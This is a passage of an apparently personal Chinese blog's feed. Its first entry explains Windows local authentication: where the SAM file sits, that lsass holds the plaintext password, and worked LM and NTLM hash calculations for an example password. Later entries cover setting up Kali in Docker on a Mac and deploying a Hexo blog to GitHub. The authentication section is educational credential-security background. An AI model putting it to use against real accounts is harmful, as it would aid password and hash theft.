    <content type="html"><![CDATA[<h1 id="window本地认证之NTML哈希和LM哈希"><a href="#window本地认证之NTML哈希和LM哈希" class="headerlink" title="window本地认证之NTML哈希和LM哈希"></a>window本地认证之NTML哈希和LM哈希</h1><h2 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h2><p>windows的登录密码是储存在本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与 SAM文件中的密码进行对比。</p><p>SAM文件是位于<code> %SystemRoot%\system32\config\</code> 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密码。</p><p>windowsbending认证流程如下：</p><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面，也就是输入框界面，接收用户的输入 信息后，将密码交给lsass进程，这个过程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库进 行比较认证。</p><h2 id="LM和NTLM哈希"><a href="#LM和NTLM哈希" class="headerlink" title="LM和NTLM哈希"></a>LM和NTLM哈希</h2><p> Windows操作系统中的密码一般由两部分组成,一部分为 LM Hash,另一部分为NTLMHash。在 Windows操作系统中,Hash的结构通常如下</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">username:RID:LM‐HASH:NT‐HASH<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="LM-HASH原理"><a href="#LM-HASH原理" class="headerlink" title="LM HASH原理"></a>LM HASH原理</h2><p>1、将明文口令转换为其大写形式 假设这里以明文Admin@123为例，转换为大写格式为:ADMIN@123 2、 将字 符串大写后转换为16进制字符串转换后为 41 44 4D 49 4E 40 31 32 33 3、密码不足14字节要求用0补全， 1Byte&#x3D;8bit,上面的16进制字符串共9个字节,还差5个字节 我么使用 00 00 00 00 00 补全为 41 44 4D 49 4E 40 31 32 33 00 00 00 00 00 4、将上述编码分成2组7字节</p><pre class="line-numbers language-#" data-language="#"><code class="language-#">41444D494E4031 第一组 32330000000000 第二组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2、将每一组7字节的十六进制转换为二进制，每7bit一组末尾加0，再转换成十六进制组成得到2组8字节的编码：</p><p><em>第一组</em></p><pre class="line-numbers language-#" data-language="#"><code class="language-#">16进制:41 44 4D 49 4E 40 31 转换为二进制:01000001010001000100110101001001010011100100000000110001 七个为一组末尾补0100000010100010000100101010100010010100011100100000000001100010 合并后为0100000010100010000100101010100010010100011100100000000001100010 在转换为16进制:40A212A894720062<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>第二组</em></p><pre class="line-numbers language-#" data-language="#"><code class="language-#"> 16进制:32 33 00 00 00 00 00 转换为二进制:00110010001100110000000000000000000000000000000000000000 七个为一组末尾补0011001000011000110000000000000000000000000000000000000000000000 合并后为0011001000011000110000000000000000000000000000000000000000000000 在转换为16进制:3218C00000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串 KGS!@#$% 进行加密 KGS!@#$%的16进制为 <code>4B47532140232425</code></p><p><img src="/imgs/windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E4%B8%8E%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81/image-20220809154318620.png" alt="image-20220809154318620"></p><p>4、最终结果拼接即可<code>6F08D7B306B1DAD4B75E0C8D76954A50</code></p><h2 id="NTLM-Hash原理"><a href="#NTLM-Hash原理" class="headerlink" title="NTLM Hash原理"></a>NTLM Hash原理</h2><p>1、将明文口令转换成十六进制的格式 如:Admin@123 转换成Unicode格式，即在每个字节之后添加0x00</p><pre class="line-numbers language-#" data-language="#"><code class="language-#">Admin@123转16进制 41646D696E40313233添加00:410064006D0069006E004000310032003300<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2、对Unicode字符串作MD4加密，生成32位的十六进制数字串 <code>570a9a65db8fba761c1008a51d4c95ab</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;window本地认证之NTML哈希和LM哈希&quot;&gt;&lt;a href=&quot;#window本地认证之NTML哈希和LM哈希&quot; class=&quot;headerlink&quot; title=&quot;window本地认证之NTML哈希和LM哈希&quot;&gt;&lt;/a&gt;window本地认证之NTML哈希和LM</summary>
      
    
    
    
    <category term="Something" scheme="https://tripexlove.github.io/categories/Something/"/>
    
    
    <category term="blog" scheme="https://tripexlove.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>mac使用docker搭建kali虚拟机</title>
    <link href="https://tripexlove.github.io/p/4661.html"/>
    <id>https://tripexlove.github.io/p/4661.html</id>
    <published>2022-08-08T12:36:56.000Z</published>
    <updated>2023-08-22T23:23:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>首先本文对使用mac尤其是m1芯片从事安全行业的朋友尤其友好。</p><p>使用m1芯片的各位肯定经常会遇到软件与arm架构不兼容的问题，我就遇到了无数回。<br>经常是因为一个软体就要配置配置一下午。比方说一个软件要安装它，又要给它配置环境变量又要配置网络，经常要踩无数个坑才可以把软件安装好。而kali正好就帮我们解决的这个问题，kali中集成了可以说百分之九十安全行业日常工作所需的工具。</p><p>but！！！ 对于一个随随便便就要几十G的虚拟机而言又显得极为臃肿，并且在mac上使用虚拟机并不是一件轻松地事情。</p><p>有没有什么好的解决方法呢？当然有，他就是<strong>docker</strong>！</p><h1 id="docker是什么"><a href="#docker是什么" class="headerlink" title="docker是什么"></a>docker是什么</h1><p>对于docker首先会引入两个概念，一个是镜像一个是容器。</p><p>对于镜像可以把他理解为轻量版的虚拟机，或者理解成一个种子（你懂的）。举个例子，我下载的kali的镜像它只有131.4mb！</p><p><img src="/imgs/mac%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAkali%E8%99%9A%E6%8B%9F%E6%9C%BA/image-20220808205131019.png" alt="image-20220808205131019"></p><p>当你运行这个镜像后，它就会生成一个容器。可以理解为种子下载成了视频。而这个容器就是我们操作的本体了。</p><h1 id="docker下载"><a href="#docker下载" class="headerlink" title="docker下载"></a>docker下载</h1><p>下载docker我们在官网下载即可</p><p><a href="https://docs.docker.com/desktop/install/mac-install/">https://docs.docker.com/desktop/install/mac-install/</a></p><p><img src="/imgs/mac%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAkali%E8%99%9A%E6%8B%9F%E6%9C%BA/image-20220808205545946.png" alt="image-20220808205545946"></p><p>如果只用kali的话我建议先调整一下虚拟内存，如果大内存的土豪就当我没说。</p><p>默认是60g，我建议调到40g就完全够用了。</p><p><img src="/imgs/mac%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAkali%E8%99%9A%E6%8B%9F%E6%9C%BA/image-20220808210223623.png" alt="image-20220808210223623"></p><p>docker下载后就有了运行镜像与容器的环境了，接下来我们就需要去docker hub下载镜像。</p><p><img src="/imgs/mac%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAkali%E8%99%9A%E6%8B%9F%E6%9C%BA/image-20220808210325918.png" alt="image-20220808210325918"></p><p>不需要任何复杂的操作我们在终端里输入这条命令即可，其他环境同理：</p><p><img src="/imgs/mac%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAkali%E8%99%9A%E6%8B%9F%E6%9C%BA/image-20220808210457586.png" alt="image-20220808210457586"></p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">docker pull kalilinux&#x2F;kali-rolling<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行该镜像：</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">docker run --name kali -t -i kalilinux&#x2F;kali-rolling &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/imgs/mac%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAkali%E8%99%9A%E6%8B%9F%E6%9C%BA/image-20220808210655626.png" alt="image-20220808210655626"></p><p>此时我们就进入kali的终端，接下来我们需要下载kali中的软体，首先因为网络原因我们需要先更换一下国内的源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在该文档中添加如下信息阿里云和中科大选填，我这里用的是阿里云的源：</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">#阿里云deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contribdeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali-security kali-rolling&#x2F;updates main contrib non-free#中科大 deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib  deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更新apt</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">apt-get update &amp;&amp; apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装kali所需软件</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">apt-get install kali-linux-everything   &#x2F;&#x2F;这是安装全部apt-get install kali-tools-top10        &#x2F;&#x2F;这是安装top 10工具<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果安装的全部的话过程极其缓慢，耐心等待即可。<br>过程遇到停顿一路回车即可。<br>安装结束后该容器会自动命名为kali。</p><h1 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h1><p>此时我们关闭容器只需输入</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">docker stop kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开容器</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">docker start kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开终端</p><pre class="line-numbers language-#shell" data-language="#shell"><code class="language-#shell">docker exec -it kali &#x2F;bin&#x2F;bash    &#x2F;&#x2F;此为使用bash开启终端docker exec -it kali &#x2F;bin&#x2F;zsh     &#x2F;&#x2F;此为使用zsh开启终端，本人更加推荐zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后我们就可以愉快的在mac当中使用kali了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;首先本文对使用mac尤其是m1芯片从事安全行业的朋友尤其友好。&lt;/p&gt;
&lt;p&gt;使用m1芯片的各位肯定经常会遇到软件与arm架</summary>
      
    
    
    
    <category term="Something" scheme="https://tripexlove.github.io/categories/Something/"/>
    
    
    <category term="blog" scheme="https://tripexlove.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>Matery主题代码块问题</title>
    <link href="https://tripexlove.github.io/p/undefined.html"/>
    <id>https://tripexlove.github.io/p/undefined.html</id>
    <published>2022-08-05T15:29:37.000Z</published>
    <updated>2022-08-05T15:38:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用代码块时遇到不能正常显示的问题：</p><img src="/imgs/Matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E9%97%AE%E9%A2%98/image-20220805233444630.png" alt="image-20220805233444630" style="zoom:33%;" /><p>死角方方相当的丑陋。</p><p><code>cd</code>到blog的根目录下修改_config.yml文件即可解决该问题</p><img src="/imgs/Matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E9%97%AE%E9%A2%98/image-20220805233741515.png" alt="image-20220805233741515" style="zoom: 33%;" /><img src="/imgs/Matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E9%97%AE%E9%A2%98/image-20220805233817353.png" alt="image-20220805233817353" style="zoom:33%;" /><p>瞬间心情愉悦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用代码块时遇到不能正常显示的问题：&lt;/p&gt;
&lt;img src=&quot;/imgs/Matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E9%97%AE%E9%A2%98/image-20220805233444630.png&quot;</summary>
      
    
    
    
    <category term="Something" scheme="https://tripexlove.github.io/categories/Something/"/>
    
    
    <category term="blog" scheme="https://tripexlove.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>hexo部署github记录</title>
    <link href="https://tripexlove.github.io/p/37324.html"/>
    <id>https://tripexlove.github.io/p/37324.html</id>
    <published>2022-08-05T07:42:10.000Z</published>
    <updated>2023-08-22T23:23:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直以为搭建博客是一个十分麻烦的事情，通过看过国光大佬的博客才知道hexo这个玩意儿。<br>网上一搜才发现原来搭建一个博客这么简单而且完全for free<br>我的博客已经搭建好了但是没有内容，所以就先记录一下搭建的过程，顺便看一下在这过程中是否还会遇到别的问题。（希望顺利）</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>1.notejs下载 <a href="https://nodejs.org/en/">链接</a><br>2.git下载<br>3.hexo下载<br>4.注册github账号<br>5.本地生成ssh keys</p><h1 id="notejs下载"><a href="#notejs下载" class="headerlink" title="notejs下载"></a>notejs下载</h1><p>这个没什么说的 <a href="https://nodejs.org/en/">链接</a> 一路傻瓜式操作就完了</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805170655723.png" alt="image-20220805170655723"></p><p>↑（hexo搭配typora的图片问题之后我应该会再写一篇blog来讲解）</p><h1 id="git下载"><a href="#git下载" class="headerlink" title="git下载"></a>git下载</h1><h2 id="常规下载"><a href="#常规下载" class="headerlink" title="常规下载"></a>常规下载</h2><p>常规情况可以到<a href="https://git-scm.com/downloads/">git官方网站</a>进行下载</p><h2 id="M1-mac下载方式"><a href="#M1-mac下载方式" class="headerlink" title="M1 mac下载方式"></a>M1 mac下载方式</h2><p>常规情况就不必多说，针对m1的mac我推荐这个镜像网站进行下载<a href="https://www.newbe.pro/Mirrors/Mirrors-Git-For-MacOS/">镜像链接</a></p><h1 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h1><p>安装完了git就可以下载hexo了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载完成后使用<code>hexo -v</code>查看一下是否安装成功</p><p>首先先创建一个blog的根目录，我这里是在&#x2F;Users&#x2F;mac目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /Users/mac<span class="token function">mkdir</span> blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>cd</code>到blog目录下就可以进行hexo初始化了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo init<span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开启hexo服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo ghexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此时在浏览器中输入localhost:4000就可以看到博客了</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805215641684.png" alt="image-20220805215641684"></p><p>看起来是不是很赏心悦目，哈哈哈，我十分喜欢这个主题，稍后告诉大家如何配置这个主题</p><h1 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h1><p>有了这个好看的博客，肯定能只在本地自己看，所以接下来我们就要把博客部署到github上面</p><h2 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h2><p>点击new repo创建一个新的仓库</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805221603298.png"></p><p>这里name一定要与用户名一致（这里因为我已经创建了所以提示exists）</p><p>Add a README file 也一定要勾选</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805221741533.png" alt="image-20220805221741533"></p><h2 id="sshkey-生成"><a href="#sshkey-生成" class="headerlink" title="sshkey 生成"></a>sshkey 生成</h2><p>在2021年8月 github移除了账号密码认证git的方法，因为这个我推送了一晚上报错了一晚上</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805220159425.png" alt="image-20220805220159425"></p><p>所以我们使用ssh方法，因此我们首先要生成sshkey</p><p>生成密钥文件<br>打开终端 输入命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"username"</span> // username为你git上的用户名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下里命令行可能会返回以下内容</p><p><code>Generating public/private rsa key pair. Enter file in which to save the key (/Users/username/.ssh/id_rsa):</code></p><p>我们直接回车，命令行继续提示</p><p><code>/Users/your username/.ssh/id_rsa already exists.Overwrite (y/n)?</code></p><p>输入 y，命令行继续提示</p><p><code>Enter passphrase(empty for no passphrase)</code></p><p>直接回车， 这时SSH key就已经生成了 文件目录就是：username&#x2F;.ssh&#x2F;id_rsa.pub<br>我们打开id_esa.pub将其中的内容复制下来</p><h2 id="将项目部署到github"><a href="#将项目部署到github" class="headerlink" title="将项目部署到github"></a>将项目部署到github</h2><p>首先打开github 将刚复制的内容添加进去</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805221158519.png" alt="image-20220805221158519"></p><p>之后我们需要到blog的根目录下编辑_config.yml文件</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805221325297.png" alt="image-20220805221325297"></p><p>到最后一行添加如下内容：</p><p>repo是仓库的意思，把链接中的用户名替换程你的就可以了</p><p><img src="/imgs/hexo%E9%83%A8%E7%BD%B2github%E8%AE%B0%E5%BD%95/image-20220805221406742.png" alt="image-20220805221406742"></p><p>回到终端使用<code>hexo d</code>即可推送到github</p><p>使用username.github.io即可访问blog了</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>下次我一定要变操作边记录，单独花时间写blog太枯燥了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前一直以为搭建博客是一个十分麻烦的事情，通过看过国光大佬的博客才知道hexo这个玩意儿。&lt;br&gt;网上一搜才发现原来搭建一个博客这么简单而且完全for free&lt;br&gt;我的博客已经搭建好了但是没有内容，所以就先记录一下搭建的过程，顺便看一下在这过程中是否还会遇到别的问题。（</summary>
      
    
    
    
    <category term="Something" scheme="https://tripexlove.github.io/categories/Something/"/>
    
    
    <category term="blog" scheme="https://tripexlove.github.io/tags/blog/"/>
    
  </entry>
  
</feed>
